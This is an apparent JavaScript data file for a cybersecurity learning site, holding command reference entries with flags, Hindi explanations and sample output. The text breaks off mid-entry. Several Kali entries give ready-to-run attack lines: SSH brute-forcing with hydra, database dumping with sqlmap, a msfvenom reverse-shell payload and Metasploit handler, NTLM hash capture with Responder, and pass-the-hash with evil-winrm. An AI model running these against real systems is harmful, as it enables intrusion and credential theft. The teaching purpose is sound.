// CYBER WARRIORS LEARNING ACADEMY - Essential Commands Repository
// 105+ Exhaustive Command Profiles with Syntax, Flags, Output Samples & Hindi Guides

export const COMMAND_CATEGORIES = [
  {
    "id": "all",
    "label": "All Commands (105)",
    "count": "105"
  },
  {
    "id": "networking",
    "label": "Networking & Protocols (26)",
    "count": "26"
  },
  {
    "id": "kali",
    "label": "Kali Linux & Hacking (36)",
    "count": "36"
  },
  {
    "id": "it",
    "label": "SysAdmin & IT Core (27)",
    "count": "27"
  },
  {
    "id": "forensics",
    "label": "Cyber Forensics & IR (20)",
    "count": "20"
  }
];

export const COMMANDS_DATA = [
  {
    "id": "net-01",
    "cmd": "ping",
    "syntax": "ping [options] <destination_host_or_ip>",
    "category": "networking",
    "subCategory": "Network Diagnostics",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Sends ICMP Echo Request packets to test network connectivity, round-trip latency, and packet loss to a remote host.",
    "summary_hi": "Remote server ya router tak connection check karta hai aur response time (latency) wa packet loss calculate karta hai.",
    "options": [
      {
        "flag": "-c <count>",
        "desc": "Linux: Stop after sending specified number of packets (e.g. -c 4)"
      },
      {
        "flag": "-t",
        "desc": "Windows: Ping target continuously until manually interrupted (Ctrl+C)"
      },
      {
        "flag": "-i <interval>",
        "desc": "Wait specified interval seconds between sending packets"
      },
      {
        "flag": "-s <size>",
        "desc": "Specify number of data bytes to send (default 56 on Linux, 32 on Windows)"
      }
    ],
    "example": "ping -c 4 8.8.8.8",
    "outputSample": "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=13.8 ms\n--- 8.8.8.8 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms"
  },
  {
    "id": "net-02",
    "cmd": "traceroute / tracert",
    "syntax": "traceroute [options] <host> (Linux) | tracert <host> (Windows)",
    "category": "networking",
    "subCategory": "Route Discovery",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Traces the hop-by-hop physical routing path that IP packets travel from your host to the destination using TTL increments.",
    "summary_hi": "Aapke computer se destination server tak data kin-kin routers (hops) se hokar gujarta hai, unka rasta batata hai.",
    "options": [
      {
        "flag": "-n",
        "desc": "Linux: Print hop IP addresses numerically without resolving hostnames"
      },
      {
        "flag": "-d",
        "desc": "Windows: Do not resolve addresses to hostnames (speeds up trace)"
      },
      {
        "flag": "-m <max_ttl>",
        "desc": "Set maximum number of hops to search (default 30)"
      },
      {
        "flag": "-p <port>",
        "desc": "Specify destination port to target (UDP traceroute)"
      }
    ],
    "example": "traceroute -n 1.1.1.1",
    "outputSample": "traceroute to 1.1.1.1 (1.1.1.1), 30 hops max, 60 byte packets\n 1  192.168.1.1  1.120 ms  1.080 ms  1.050 ms\n 2  10.20.0.1    8.420 ms  8.390 ms  8.350 ms\n 3  1.1.1.1      12.140 ms 12.110 ms 12.090 ms"
  },
  {
    "id": "net-03",
    "cmd": "netstat",
    "syntax": "netstat [options]",
    "category": "networking",
    "subCategory": "Port & Connection Auditing",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Displays active TCP/UDP network connections, routing tables, interface statistics, and listening service ports.",
    "summary_hi": "System ke active internet connections, open listening ports aur unse jude processes ki detail list dikhata hai.",
    "options": [
      {
        "flag": "-t",
        "desc": "Display active TCP connections"
      },
      {
        "flag": "-u",
        "desc": "Display active UDP connections"
      },
      {
        "flag": "-l",
        "desc": "Show only listening sockets"
      },
      {
        "flag": "-n",
        "desc": "Show numeric addresses and port numbers instead of resolving names"
      },
      {
        "flag": "-p",
        "desc": "Show PID and process name owning each socket (Linux, requires sudo)"
      },
      {
        "flag": "-ano",
        "desc": "Windows: Show all active connections with numeric ports and owning Process PID"
      }
    ],
    "example": "netstat -tulnp",
    "outputSample": "Proto Recv-Q Send-Q Local Address    Foreign Address  State       PID/Program name\ntcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN      842/sshd\ntcp        0      0 127.0.0.1:3306   0.0.0.0:*        LISTEN      1124/mysqld\ntcp        0      0 0.0.0.0:80       0.0.0.0:*        LISTEN      953/nginx"
  },
  {
    "id": "net-04",
    "cmd": "ss",
    "syntax": "ss [options] [filter]",
    "category": "networking",
    "subCategory": "Socket Statistics",
    "level": "Modern Core",
    "dangerLevel": "Safe",
    "summary": "Modern, high-speed replacement for netstat in Linux. Dumps socket statistics directly from kernel space.",
    "summary_hi": "Netstat ka modern aur fast replacement. Kernel se seedha open ports aur socket info fast read karta hai.",
    "options": [
      {
        "flag": "-t -a",
        "desc": "Display all TCP sockets (both listening and established)"
      },
      {
        "flag": "-u -a",
        "desc": "Display all UDP sockets"
      },
      {
        "flag": "-l",
        "desc": "Show only listening sockets"
      },
      {
        "flag": "-p",
        "desc": "Show process using socket"
      },
      {
        "flag": "sport = :80",
        "desc": "Filter sockets matching source port 80"
      }
    ],
    "example": "ss -tulpn",
    "outputSample": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:((\"sshd\",pid=842,fd=3))\ntcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*     users:((\"nginx\",pid=953,fd=6))"
  },
  {
    "id": "net-05",
    "cmd": "ip (iproute2)",
    "syntax": "ip [object] [command]",
    "category": "networking",
    "subCategory": "Interface & Route Control",
    "level": "Essential",
    "dangerLevel": "Safe / Admin",
    "summary": "Linux standard network management utility. Controls network interfaces, IP addresses, ARP neighbors, and IP routing.",
    "summary_hi": "Linux me IP address assign karne, network interface on/off karne aur default gateway set karne ka modern tool.",
    "options": [
      {
        "flag": "addr show (or ip a)",
        "desc": "Display all IP addresses assigned to network interfaces"
      },
      {
        "flag": "route show (or ip r)",
        "desc": "Display kernel IP routing table"
      },
      {
        "flag": "link set dev eth0 up/down",
        "desc": "Enable or disable a specific network interface"
      },
      {
        "flag": "neigh show",
        "desc": "Display ARP / neighbor resolution table"
      }
    ],
    "example": "ip -c a show eth0",
    "outputSample": "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP\n    inet 192.168.1.150/24 brd 192.168.1.255 scope global eth0\n       valid_lft forever preferred_lft forever"
  },
  {
    "id": "net-06",
    "cmd": "tcpdump",
    "syntax": "tcpdump [options] [expression]",
    "category": "networking",
    "subCategory": "Packet Capture & Sniffing",
    "level": "Advanced",
    "dangerLevel": "Audit/Probe",
    "summary": "Powerful command-line packet sniffer. Captures and analyzes TCP/IP packets passing through a network interface in real time.",
    "summary_hi": "Network wire par chal rahe raw data packets ko live capture aur inspect karne ka command-line sniffer.",
    "options": [
      {
        "flag": "-i <interface>",
        "desc": "Specify network interface to listen on (e.g. eth0, any)"
      },
      {
        "flag": "-nn",
        "desc": "Do not resolve hostnames or port names to domain names (faster, pure IP)"
      },
      {
        "flag": "-w <file.pcap>",
        "desc": "Save raw captured packets to Wireshark PCAP file"
      },
      {
        "flag": "-r <file.pcap>",
        "desc": "Read and parse an existing PCAP capture file"
      },
      {
        "flag": "port 80 or port 443",
        "desc": "BPF filter: Capture only web traffic"
      }
    ],
    "example": "tcpdump -i eth0 -nn \"port 80 or port 443\" -c 10",
    "outputSample": "IP 192.168.1.150.54320 > 142.250.190.46.443: Flags [P.], seq 1:450, ack 1, win 502, length 449\nIP 142.250.190.46.443 > 192.168.1.150.54320: Flags [.], ack 450, win 260, length 0"
  },
  {
    "id": "net-07",
    "cmd": "nc (netcat)",
    "syntax": "nc [options] <host> <port>",
    "category": "networking",
    "subCategory": "Swiss Army Knife",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Arbitrary TCP/UDP connections and listens. Used for port scanning, banner grabbing, transferring files, and reverse shells.",
    "summary_hi": "Networking ka Swiss Army knife. Ports check karne, banners grab karne, file share karne aur listeners setup karne me use hota hai.",
    "options": [
      {
        "flag": "-v / -vv",
        "desc": "Verbose / very verbose mode"
      },
      {
        "flag": "-z",
        "desc": "Zero-I/O mode (used for fast port scanning without sending data)"
      },
      {
        "flag": "-l",
        "desc": "Listen mode, for inbound connections"
      },
      {
        "flag": "-p <port>",
        "desc": "Specify local listen port"
      },
      {
        "flag": "-n",
        "desc": "Numeric-only IP addresses, no DNS resolution"
      }
    ],
    "example": "nc -zv 192.168.1.1 20-80",
    "outputSample": "Connection to 192.168.1.1 22 port [tcp/ssh] succeeded!\nConnection to 192.168.1.1 80 port [tcp/http] succeeded!"
  },
  {
    "id": "net-08",
    "cmd": "curl",
    "syntax": "curl [options] <URL>",
    "category": "networking",
    "subCategory": "Web & API Transfer",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Command line tool and library for transferring data with URLs using HTTP, HTTPS, FTP, and dozens of protocols.",
    "summary_hi": "Command line se web servers se data download, HTTP request send aur APIs test karne ka best tool.",
    "options": [
      {
        "flag": "-I / --head",
        "desc": "Fetch HTTP headers only (great for server banner grabbing)"
      },
      {
        "flag": "-k / --insecure",
        "desc": "Allow insecure SSL/TLS connections (bypasses self-signed certificate errors)"
      },
      {
        "flag": "-X <METHOD>",
        "desc": "Specify custom HTTP method (GET, POST, PUT, DELETE)"
      },
      {
        "flag": "-d \"data\"",
        "desc": "Send POST request body data"
      },
      {
        "flag": "-o <file>",
        "desc": "Save output payload to local filename"
      }
    ],
    "example": "curl -I -s https://example.com",
    "outputSample": "HTTP/2 200 \nserver: ECS (dcb/7F3B)\ncontent-type: text/html; charset=UTF-8\ndate: Wed, 30 Sep 2026 12:00:00 GMT"
  },
  {
    "id": "net-09",
    "cmd": "dig",
    "syntax": "dig [@server] <domain> [query_type]",
    "category": "networking",
    "subCategory": "DNS Querying",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Domain Information Groper. Flexible DNS lookup utility for querying DNS name servers for A, MX, NS, TXT, and SOA records.",
    "summary_hi": "Domain ke DNS records (A, MX, NS, TXT, CNAME) ki detail jankari nikaalne ke liye DNS investigation tool.",
    "options": [
      {
        "flag": "+short",
        "desc": "Display only concise IP or record answer"
      },
      {
        "flag": "+trace",
        "desc": "Trace DNS delegation path hierarchically from root servers"
      },
      {
        "flag": "ANY",
        "desc": "Query all available record types for the domain"
      },
      {
        "flag": "@<dns_server>",
        "desc": "Query a specific nameserver (e.g. @8.8.8.8)"
      }
    ],
    "example": "dig +trace google.com A",
    "outputSample": ";; ANSWER SECTION:\ngoogle.com.     300     IN      A       142.250.190.46\n;; Query time: 18 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)"
  },
  {
    "id": "net-10",
    "cmd": "arp",
    "syntax": "arp [options]",
    "category": "networking",
    "subCategory": "L2 MAC Resolution",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Displays and modifies the Address Resolution Protocol (ARP) cache mapping IP addresses to physical MAC addresses.",
    "summary_hi": "Local network me IP address aur MAC address ke mapping table (ARP cache) ko dekhne aur verify karne ka command.",
    "options": [
      {
        "flag": "-a",
        "desc": "Display current ARP entries in cache"
      },
      {
        "flag": "-d <ip>",
        "desc": "Delete an entry for specified IP address"
      },
      {
        "flag": "-s <ip> <mac>",
        "desc": "Create a permanent static ARP mapping entry (prevents ARP spoofing)"
      }
    ],
    "example": "arp -a",
    "outputSample": "Interface: 192.168.1.50\n  Internet Address      Physical Address      Type\n  192.168.1.1           00-50-56-c0-00-08     dynamic\n  192.168.1.254         e0-2b-96-44-11-2a     dynamic"
  },
  {
    "id": "net-11",
    "cmd": "iptables",
    "syntax": "iptables -[A|D|I] <chain> [match] -j <target>",
    "category": "networking",
    "subCategory": "Firewall & Packet Filter",
    "level": "Advanced",
    "dangerLevel": "Admin / Critical",
    "summary": "Linux kernel packet filtering firewall. Inspects incoming, forward, and outgoing network packets against security rule tables.",
    "summary_hi": "Linux ka main firewall tool jo incoming aur outgoing network traffic ko allow, block ya drop karne ke niyam banata hai.",
    "options": [
      {
        "flag": "-L -n -v",
        "desc": "List all firewall rules with numerical IPs and packet counters"
      },
      {
        "flag": "-A INPUT",
        "desc": "Append new rule to INPUT chain"
      },
      {
        "flag": "-p tcp --dport 22",
        "desc": "Match TCP protocol on destination port 22"
      },
      {
        "flag": "-j DROP / ACCEPT",
        "desc": "Jump target: DROP (silently reject) or ACCEPT"
      }
    ],
    "example": "iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT",
    "outputSample": "Chain INPUT (policy DROP 12 packets, 720 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n  150 12500 ACCEPT     tcp  --  eth0   *       192.168.1.0/24       0.0.0.0/0            tcp dpt:22"
  },
  {
    "id": "net-12",
    "cmd": "ufw (Uncomplicated Firewall)",
    "syntax": "ufw <action> [arguments]",
    "category": "networking",
    "subCategory": "Firewall Management",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "User-friendly interface for managing iptables on Ubuntu and Debian Linux servers.",
    "summary_hi": "Ubuntu/Debian me iptables firewall ko aasan syntax ke saath configure aur manage karne ka tool.",
    "options": [
      {
        "flag": "status numbered",
        "desc": "Show status and numbered list of all active firewall rules"
      },
      {
        "flag": "enable / disable",
        "desc": "Turn on or turn off the firewall"
      },
      {
        "flag": "allow 22/tcp",
        "desc": "Allow inbound connections on TCP port 22"
      },
      {
        "flag": "deny from <ip>",
        "desc": "Block all incoming packets from specified malicious IP"
      }
    ],
    "example": "ufw status numbered",
    "outputSample": "Status: active\n\n     To                         Action      From\n     --                         ------      ----\n[ 1] 22/tcp                     ALLOW IN    Anywhere\n[ 2] 443/tcp                    ALLOW IN    Anywhere"
  },
  {
    "id": "kali-01",
    "cmd": "nmap",
    "syntax": "nmap [Scan Type] [Options] {target specification}",
    "category": "kali",
    "subCategory": "Network Recon & Port Scanner",
    "level": "Essential",
    "dangerLevel": "Audit/Probe",
    "summary": "Network Mapper. Used for network discovery, open port scanning, OS detection, service version auditing, and vulnerability scanning via NSE scripts.",
    "summary_hi": "Hacking aur defense ka sabse mashhoor tool. Network ke open ports, services, operating system aur kamzoriyon ko scan karta hai.",
    "options": [
      {
        "flag": "-sS",
        "desc": "TCP SYN Stealth Scan (half-open scan, does not complete 3-way handshake)"
      },
      {
        "flag": "-sV",
        "desc": "Probe open ports to determine running service names and version numbers"
      },
      {
        "flag": "-sC / --script",
        "desc": "Execute default NSE vulnerability and discovery scripts"
      },
      {
        "flag": "-p-",
        "desc": "Scan all 65,535 TCP ports on the target host"
      },
      {
        "flag": "-A",
        "desc": "Enable OS detection, version scanning, script scanning, and traceroute"
      },
      {
        "flag": "-T4",
        "desc": "Set aggressive timing template for faster scans"
      }
    ],
    "example": "nmap -sV -sC -T4 -p 22,80,443 192.168.1.100",
    "outputSample": "PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Tactical SOC Defense Portal\n443/tcp open  ssl/http Apache httpd 2.4.52"
  },
  {
    "id": "kali-02",
    "cmd": "hydra",
    "syntax": "hydra -l <user> -P <wordlist> <target> <service>",
    "category": "kali",
    "subCategory": "Online Password Cracking",
    "level": "Core",
    "dangerLevel": "Aggressive",
    "summary": "Parallelized network login cracker. Supports rapid brute-force attacks against SSH, FTP, HTTP, Telnet, SMB, and RDP authentication portals.",
    "summary_hi": "Network services (SSH, FTP, Web Login, RDP) par brute-force password guess karne ka superfast parallel tool.",
    "options": [
      {
        "flag": "-l <user> / -L <file>",
        "desc": "Specify single username or wordlist of usernames"
      },
      {
        "flag": "-p <pass> / -P <file>",
        "desc": "Specify single password or wordlist of passwords"
      },
      {
        "flag": "-t <tasks>",
        "desc": "Number of parallel threads/tasks (e.g. -t 4 or -t 16)"
      },
      {
        "flag": "-V / -vV",
        "desc": "Show login attempts and tested passwords in terminal"
      },
      {
        "flag": "-s <port>",
        "desc": "Specify custom port if service does not use default"
      }
    ],
    "example": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 4",
    "outputSample": "Hydra v9.5 (c) 2023 by van Hauser / THC\n[22][ssh] host: 192.168.1.50   login: root   password: password123\n1 of 1 target successfully completed, 1 valid password found"
  },
  {
    "id": "kali-03",
    "cmd": "john (John the Ripper)",
    "syntax": "john [options] [hash_file]",
    "category": "kali",
    "subCategory": "Offline Hash Cracker",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Fast password hash recovery tool. Cracks UNIX DES, MD5, SHA-256, SHA-512, Windows NTLM, and encrypted archives (ZIP, RAR, PDF).",
    "summary_hi": "Hashed passwords (Linux /etc/shadow, Windows SAM, ZIP/PDF) ko dictionary aur brute-force se crack karta hai.",
    "options": [
      {
        "flag": "--wordlist=<path>",
        "desc": "Specify path to dictionary wordlist (e.g. rockyou.txt)"
      },
      {
        "flag": "--format=<type>",
        "desc": "Specify hash format (e.g. raw-md5, sha512crypt, nt, zip)"
      },
      {
        "flag": "--show",
        "desc": "Display all previously cracked passwords from potfile"
      },
      {
        "flag": "--rules",
        "desc": "Enable word mangling rules (e.g. capitalizing, appending digits)"
      }
    ],
    "example": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=raw-md5",
    "outputSample": "Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\ndragon           (admin_hash)     \n1g 0:00:00:01 DONE (2026-09-30 12:00) 0.8196g/s 2048Kp/s 2048Kc/s"
  },
  {
    "id": "kali-04",
    "cmd": "hashcat",
    "syntax": "hashcat [options] <hash_file> [mask|wordlists]",
    "category": "kali",
    "subCategory": "GPU-Accelerated Cracker",
    "level": "Advanced",
    "dangerLevel": "Audit/Probe",
    "summary": "World fastest GPU-accelerated password recovery engine. Utilizes NVIDIA CUDA / OpenCL for billions of hashes per second.",
    "summary_hi": "Duniya ka sabse fast password cracker jo computer ke GPU graphics card ki taakat se arabon hashes per second test karta hai.",
    "options": [
      {
        "flag": "-m <hash_mode>",
        "desc": "Hash type (0 = MD5, 1000 = NTLM, 1800 = sha512crypt, 22000 = WPA-PBKDF2)"
      },
      {
        "flag": "-a <attack_mode>",
        "desc": "Attack mode (0 = Straight Wordlist, 3 = Pure Brute-Force Mask)"
      },
      {
        "flag": "-r <rule_file>",
        "desc": "Apply rule file (e.g. rules/best64.rule)"
      },
      {
        "flag": "-O",
        "desc": "Enable optimized kernel code (speeds up cracking significantly)"
      }
    ],
    "example": "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
    "outputSample": "Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 1000 (NTLM)\nSpeed.#1.........: 12540.2 MH/s\nCracked..........: 1/1 (100.00%) Digests"
  },
  {
    "id": "kali-05",
    "cmd": "aircrack-ng",
    "syntax": "aircrack-ng [options] <capture_file.cap>",
    "category": "kali",
    "subCategory": "Wi-Fi Security Auditing",
    "level": "Advanced",
    "dangerLevel": "Audit/Probe",
    "summary": "802.11 WEP and WPA/WPA2-PSK key cracking program. Analyzes 4-way EAPOL handshakes captured from wireless networks.",
    "summary_hi": "Wi-Fi router ke captured WPA/WPA2 4-way handshakes ko wordlist ke saath match karke Wi-Fi password nikaalta hai.",
    "options": [
      {
        "flag": "-w <wordlist>",
        "desc": "Path to wordlist containing candidate passwords"
      },
      {
        "flag": "-b <bssid>",
        "desc": "Target Access Point MAC address (BSSID)"
      },
      {
        "flag": "-e <essid>",
        "desc": "Target Wi-Fi network name (SSID)"
      },
      {
        "flag": "-q",
        "desc": "Quiet mode, suppresses banner and standard progress"
      }
    ],
    "example": "aircrack-ng -w rockyou.txt -b 00:14:6C:7E:40:80 wifi-capture.cap",
    "outputSample": "KEY FOUND! [ cyberwarrior2026 ]\nMaster Key     : AB 45 89 ...\nTransient Key  : 12 EF 90 ..."
  },
  {
    "id": "kali-06",
    "cmd": "sqlmap",
    "syntax": "sqlmap -u \"<target_url>\" [options]",
    "category": "kali",
    "subCategory": "Automated Database Exploitation",
    "level": "Advanced",
    "dangerLevel": "Aggressive",
    "summary": "Automated tool that detects and exploits SQL injection vulnerabilities in web applications and dumps backend database tables.",
    "summary_hi": "Web applications me SQL Injection dhundne aur database ka pura data (tables, passwords) extract karne ka automated tool.",
    "options": [
      {
        "flag": "-u <URL>",
        "desc": "Target URL with parameter (e.g. \"http://site.com/item.php?id=1\")"
      },
      {
        "flag": "--dbs",
        "desc": "Enumerate all available databases on target DBMS"
      },
      {
        "flag": "-D <db> --tables",
        "desc": "Enumerate tables within a specific database"
      },
      {
        "flag": "-T <table> --dump",
        "desc": "Dump all table rows and entries into readable format"
      },
      {
        "flag": "--batch",
        "desc": "Never ask for user input, use default behavior automatically"
      }
    ],
    "example": "sqlmap -u \"http://target.local/vuln.php?id=1\" --dbs --batch",
    "outputSample": "[INFO] the back-end DBMS is MySQL\navailable databases [3]:\n[*] information_schema\n[*] defense_academy\n[*] users_credentials"
  },
  {
    "id": "kali-07",
    "cmd": "gobuster",
    "syntax": "gobuster <mode> [options]",
    "category": "kali",
    "subCategory": "Web Directory & DNS Brute-forcer",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "High-speed directory, DNS subdomain, and virtual host brute-forcer written in Go. Discovers hidden paths and backup files.",
    "summary_hi": "Website ke chhupe huye folders, admin panels, aur subdomains ko wordlist se brute-force karke expose karta hai.",
    "options": [
      {
        "flag": "dir -u <url>",
        "desc": "Directory brute-forcing mode against web URL"
      },
      {
        "flag": "-w <wordlist>",
        "desc": "Path to wordlist file"
      },
      {
        "flag": "-x <extensions>",
        "desc": "File extensions to search (e.g. -x php,html,txt,bak,zip)"
      },
      {
        "flag": "-t <threads>",
        "desc": "Number of concurrent threads (default 10, recommended 40)"
      },
      {
        "flag": "-k",
        "desc": "Skip TLS certificate verification"
      }
    ],
    "example": "gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 30",
    "outputSample": "===============================================================\nGobuster v3.5\n===============================================================\n/admin                (Status: 301) [Size: 178] [--> /admin/]\n/config.php.bak       (Status: 200) [Size: 1420]\n/robots.txt           (Status: 200) [Size: 84]"
  },
  {
    "id": "kali-08",
    "cmd": "msfconsole (Metasploit)",
    "syntax": "msfconsole [options]",
    "category": "kali",
    "subCategory": "Exploitation Framework",
    "level": "Advanced",
    "dangerLevel": "Aggressive",
    "summary": "The world most used penetration testing framework. Provides thousands of validated exploits, payloads, encoders, and post-exploitation modules.",
    "summary_hi": "Duniya ka sabse popular penetration testing framework. Isme hazaron exploits aur post-exploitation modules shamil hain.",
    "options": [
      {
        "flag": "-q",
        "desc": "Quiet mode: do not print banner on startup"
      },
      {
        "flag": "-x \"<command>\"",
        "desc": "Execute inline Metasploit commands automatically"
      },
      {
        "flag": "use <module>",
        "desc": "Select an exploit, auxiliary scanner, or post-exploitation module"
      },
      {
        "flag": "set RHOSTS <target>",
        "desc": "Set target remote host IP address"
      },
      {
        "flag": "exploit / run",
        "desc": "Launch the selected exploit payload"
      }
    ],
    "example": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; run\"",
    "outputSample": "[*] Started reverse TCP handler on 192.168.1.50:4444 \n[*] Sending stage (175686 bytes) to 192.168.1.120\n[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.120:49210)"
  },
  {
    "id": "kali-09",
    "cmd": "msfvenom",
    "syntax": "msfvenom -p <payload> [options] -f <format> -o <output>",
    "category": "kali",
    "subCategory": "Payload Generator & Encoder",
    "level": "Advanced",
    "dangerLevel": "Aggressive",
    "summary": "Metasploit standalone payload generator. Generates shellcodes, raw executables, DLLs, and APKs for multiple architectures.",
    "summary_hi": "Custom reverse shells aur security payloads generate karne ka Metasploit tool (EXE, ELF, Python, PHP, APK formats me).",
    "options": [
      {
        "flag": "-p <payload>",
        "desc": "Payload to generate (e.g. windows/x64/meterpreter/reverse_tcp)"
      },
      {
        "flag": "LHOST=<ip>",
        "desc": "Listening attacker IP address for reverse callback"
      },
      {
        "flag": "LPORT=<port>",
        "desc": "Listening attacker port"
      },
      {
        "flag": "-f <format>",
        "desc": "Output format (exe, elf, raw, c, python, war, aspx)"
      },
      {
        "flag": "-b <badchars>",
        "desc": "Characters to avoid in shellcode (e.g. \"\\x00\\x0a\\x0d\")"
      },
      {
        "flag": "-o <file>",
        "desc": "Save output payload to file"
      }
    ],
    "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf",
    "outputSample": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\nSaved as: shell.elf"
  },
  {
    "id": "kali-10",
    "cmd": "responder",
    "syntax": "responder -I <interface> [options]",
    "category": "kali",
    "subCategory": "LLMNR / NBT-NS Poisoning",
    "level": "Advanced",
    "dangerLevel": "Aggressive",
    "summary": "LLMNR, NBT-NS, and MDNS poisoner. Answers poisoned broadcast queries on local Windows networks to capture NetNTLM hashes.",
    "summary_hi": "Windows network me LLMNR/NBT-NS queries ko poison karke users ke NetNTLM password hashes capture karne ka tool.",
    "options": [
      {
        "flag": "-I <interface>",
        "desc": "Specify network interface to poison on (e.g. eth0)"
      },
      {
        "flag": "-r",
        "desc": "Enable answers for netbios wredir queries"
      },
      {
        "flag": "-d",
        "desc": "Enable answers for netbios domain name queries"
      },
      {
        "flag": "-w",
        "desc": "Start rogue WPAD proxy server to intercept browser credentials"
      }
    ],
    "example": "responder -I eth0 -rdwv",
    "outputSample": "[+] Listening for events...\n[*] [LLMNR]  Poisoned answer sent to 192.168.1.105 for name FILESVR\n[SMB] NTLMv2-SSP Client   : 192.168.1.105\n[SMB] NTLMv2-SSP Username : CORP\\administrator\n[SMB] NTLMv2-SSP Hash     : administrator::CORP:112233445566..."
  },
  {
    "id": "kali-11",
    "cmd": "evil-winrm",
    "syntax": "evil-winrm -i <target_ip> -u <user> -p <pass> [options]",
    "category": "kali",
    "subCategory": "Windows Remote Shell",
    "level": "Advanced",
    "dangerLevel": "Aggressive",
    "summary": "The ultimate WinRM remote management shell for hacking Windows hosts and Active Directory controllers.",
    "summary_hi": "Windows servers par WinRM protocol (port 5985/5986) ke zariye remote PowerShell command shell lene ka tool.",
    "options": [
      {
        "flag": "-i <ip>",
        "desc": "Target host IP address"
      },
      {
        "flag": "-u <user>",
        "desc": "Username"
      },
      {
        "flag": "-p <pass>",
        "desc": "Password (or use -H for Pass-the-Hash with NTLM)"
      },
      {
        "flag": "-H <hash>",
        "desc": "NTLM hash for Pass-The-Hash attack"
      },
      {
        "flag": "-s <scripts_dir>",
        "desc": "Local directory with PowerShell scripts for memory injection"
      }
    ],
    "example": "evil-winrm -i 10.10.10.100 -u Administrator -p \"SecureP@ss2026!\"",
    "outputSample": "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint...\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\ncorp\\administrator"
  },
  {
    "id": "kali-12",
    "cmd": "sherlock",
    "syntax": "sherlock <username> [options]",
    "category": "kali",
    "subCategory": "OSINT Username Investigation",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "OSINT reconnaissance tool. Hunts down social media profiles and online accounts by target username across 300+ social platforms.",
    "summary_hi": "Kisi bhi username ko 300 se zyada social media platforms (GitHub, Twitter, Reddit, etc.) par dhoondhne ka OSINT tool.",
    "options": [
      {
        "flag": "--print-found",
        "desc": "Print only platforms where the target username was found"
      },
      {
        "flag": "--timeout <sec>",
        "desc": "Time (in seconds) to wait for response to queries"
      },
      {
        "flag": "--csv",
        "desc": "Export results to a CSV spreadsheet file"
      }
    ],
    "example": "sherlock target_hacker --print-found",
    "outputSample": "[*] Checking username target_hacker on:\n[+] GitHub: https://github.com/target_hacker\n[+] Reddit: https://www.reddit.com/user/target_hacker\n[+] Twitter: https://twitter.com/target_hacker"
  },
  {
    "id": "it-01",
    "cmd": "systemctl",
    "syntax": "systemctl [command] [unit_name]",
    "category": "it",
    "subCategory": "Linux Service Management",
    "level": "Essential",
    "dangerLevel": "Admin",
    "summary": "Controls the systemd system and service manager on modern Linux distributions.",
    "summary_hi": "Linux me background services (jaise Nginx, SSH, MySQL) ko start, stop, restart aur enable karne ka main tool.",
    "options": [
      {
        "flag": "status <service>",
        "desc": "Check current operational status and recent log lines"
      },
      {
        "flag": "start / stop / restart",
        "desc": "Start, stop, or reload configuration of the service"
      },
      {
        "flag": "enable / disable",
        "desc": "Enable or disable automatic service startup at boot time"
      },
      {
        "flag": "failed",
        "desc": "List all services that failed during boot or runtime"
      }
    ],
    "example": "systemctl status sshd",
    "outputSample": "● sshd.service - OpenSSH server daemon\n     Loaded: loaded (/lib/systemd/system/sshd.service; enabled)\n     Active: active (running) since Wed 2026-09-30 08:00:00 UTC; 4h ago\n   Main PID: 842 (sshd)"
  },
  {
    "id": "it-02",
    "cmd": "journalctl",
    "syntax": "journalctl [options]",
    "category": "it",
    "subCategory": "Linux System Log Auditing",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Queries and displays event logs generated by systemd-journald service, kernel messages, and system daemons.",
    "summary_hi": "Linux system logs, authentication failures, aur system errors ko analyze karne ka powerful log viewer.",
    "options": [
      {
        "flag": "-u <service>",
        "desc": "View logs generated exclusively by a specific systemd unit"
      },
      {
        "flag": "-f",
        "desc": "Follow live log stream in real time (like tail -f)"
      },
      {
        "flag": "-n <lines>",
        "desc": "Show only specified number of most recent log lines"
      },
      {
        "flag": "-p <priority>",
